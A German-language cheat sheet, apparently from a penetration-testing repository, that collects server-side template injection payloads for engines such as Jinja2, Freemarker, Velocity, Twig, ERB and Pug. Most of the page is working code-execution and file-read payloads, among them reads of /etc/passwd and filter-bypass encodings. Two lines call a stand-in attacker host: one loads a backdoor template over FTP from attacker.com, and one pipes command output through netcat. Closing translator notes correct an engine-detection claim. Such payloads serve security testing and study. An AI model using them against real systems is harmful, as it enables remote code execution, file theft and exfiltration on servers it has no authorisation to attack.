# 🔥 Sammlung von SSTI-Payloads

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](SSTI.tr.md) • [🇬🇷 Ελληνικά](SSTI.el.md)

```
  ███████╗███████╗████████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██╔════╝██╔════╝╚══██╔══╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ███████╗███████╗   ██║   ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ╚════██║╚════██║   ██║   ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████║███████║   ██║   ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
                     Server-Side Template Injection
```

---

## 🔍 Payloads zur Erkennung

### Allgemeine Erkennung
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
{{7*'7'}}
```

> Wenn `49` in der Antwort erscheint, deutet dies laut Vorlage auf SSTI hin!

### Template-Engine erkennen
```
{{7*'7'}}         → Jinja2/Twig ergibt laut Vorlage 7777777
${7*7}            → Freemarker/Velocity
<%= 7*7 %>        → ERB (Ruby)
#{7*7}            → Pebble
*{7*7}            → Thymeleaf
```

---

## 🐍 Python (Jinja2)

### Erkennung
```python
{{7*7}}
{{config}}
{{config.items()}}
{{self}}
{{request}}
```

### Payloads zur Codeausführung
```python
# Methode 1 – config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Methode 2 – cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Methode 3 – MRO (laut Vorlage am häufigsten)
{{''.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}}

# Methode 4 – lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Methode 5 – Request
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Dateien lesen
```python
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read()}}
```

### Filterumgehung
```python
# Mit dem attr-Filter
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}

# Mit dem join-Filter  
{%set x=''|join('')|attr('__class__')%}

# Hex-Kodierung
{{''['\x5f\x5fclass\x5f\x5f']}}
```

---

## 🌿 Python (Mako)

```python
<%import os%>${os.popen("id").read()}
${self.module.cache.util.os.system("id")}
${self.template.module.cache.util.os.popen("id").read()}
```

---

## ☕ Java (Freemarker)

### Erkennung
```java
${7*7}
${object.class}
<#assign s="freemarker.template.utility.Execute"?new()>${s("id")}
```

### Payloads zur Codeausführung
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
${"freemarker.template.utility.Execute"?new()("id")}
```

---

## 🍃 Java (Velocity)

```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Einfaches Beispiel
```java
#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## 🌱 Java (Thymeleaf)

### Erkennung
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Payloads zur Codeausführung
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
```

---

## 🌸 Java (Pebble)

```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes) }}
```

---

## 🐦 PHP (Twig)

### Erkennung
```php
{{7*7}}
{{7*'7'}}  → 7777777 (string multiplication)
{{dump(app)}}
{{_self}}
```

### Payloads zur Codeausführung
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}

{{['id']|map('system')|join}}

{{_self.env.setCache("ftp://attacker.com:21")}}{{_self.env.loadTemplate("backdoor")}}
```

### Dateien lesen
```php
{{'/etc/passwd'|file_excerpt(1,-1)}}
```

---

## 💎 Ruby (ERB)

### Erkennung
```ruby
<%= 7*7 %>
<%= self %>
```

### Payloads zur Codeausführung
```ruby
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
<%= require 'open3'; Open3.capture2('id') %>
```

---

## 🟢 Node.js (Jade/Pug)

### Erkennung
```javascript
#{7*7}
-var x = 1; p= x
```

### Payloads zur Codeausführung
```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}

-var x = root.process.mainModule.require
-x('child_process').exec('id | nc attacker.com 80')
```

---

## 🔷 .NET (Razor)

```csharp
@(7*7)
@{
    var p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c id";
    p.Start();
}
```

---

## 📊 Kurzreferenz

| Template-Engine | Erkennung | RCE |
|-----------------|-----------|-----|
| Jinja2 | `{{7*7}}` | `{{config.__class__...}}` |
| Twig | `{{7*'7'}}` | `{{_self.env...}}` |
| Freemarker | `${7*7}` | `<#assign ex=...>` |
| Velocity | `$class.class` | `#set($rt=...)` |
| ERB | `<%= 7*7 %>` | `<%= system('id') %>` |
| Pug | `#{7*7}` | `#{global.process...}` |

---

## 🛡️ Umgehungstechniken

### Gesperrte Schlüsselwörter
```python
# Anfrageargumente verwenden
{{request.args.cmd}}?cmd=__class__

# Zeichenfolgen verknüpfen
{{''['__cla'+'ss__']}}

# Hex-Kodierung
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Gesperrte Klammern
```python
{%print(7*7)%}
```

---

## 📚 Ressourcen

- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

<p align="center">
  <b>🔥 SSTI-Payload-Sammlung</b><br>
  <i>Nur zu Lernzwecken!</i>
</p>

---

---

## Hinweise zur deutschen Ausgabe

> **Erkennung und Engine-Zuordnung:** Die Zahl `49` allein ist kein vollständiger SSTI-Nachweis; entscheidend ist, ob die konkrete serverseitige Vorlage den kontrollierten Ausdruck auswertet. Unterschiedliche Engines können dieselbe Syntax oder verschiedene Typumwandlungen verwenden. Die gemeinsame Ergebnisangabe im Original ist irreführend: Bei der üblichen Standardauswertung ergibt `7*'7'` in Jinja2 durch Zeichenkettenwiederholung `7777777`, in Twig 3.x durch numerische Multiplikation dagegen `49`. Diese Unterscheidung folgt aus den dokumentierten Operatorregeln und ersetzt keine Prüfung der konkreten Konfiguration. [Jinja: Mathematik](https://jinja.palletsprojects.com/en/stable/templates/#math), [Twig: Mathematik](https://twig.symfony.com/doc/3.x/templates.html#math).

> **Voraussetzungen der Beispiele:** Objektzugriff, Sandbox, verfügbare Klassen und Methoden hängen von Framework und Version ab. Feste Indizes in `__subclasses__()` sind insbesondere nicht portabel. Fragmente mit `...` sind absichtlich unvollständig. Die Tabelle trennt eine Rechenprobe nicht automatisch von tatsächlicher Codeausführung. Alle Template-Ausdrücke, Pfade und Codewerte bleiben unverändert; kein Payload wurde ausgeführt.
